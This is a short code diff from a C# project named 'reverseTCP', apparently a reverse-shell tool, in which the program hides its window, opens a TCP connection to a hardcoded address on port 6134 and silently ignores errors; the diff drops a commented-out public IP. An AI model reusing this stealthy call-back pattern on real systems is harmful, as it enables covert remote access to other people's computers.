@@ -16,7 +16,7 @@ namespace reverseTCP
         {
             /* Make the Window Invisible */
             invisible.hide();
-
+            
             /* Create a TcpClient */
             TcpClient clientSocket = new TcpClient();
 
@@ -26,7 +26,7 @@ namespace reverseTCP
                 try
                 {
                     /* Connect */
-                    clientSocket.Connect("192.168.178.21"/*91.89.8.184*/, 6134);
+                    clientSocket.Connect("192.168.178.21", 6134);
                 }
                 catch {
                     /* Skip the Error */
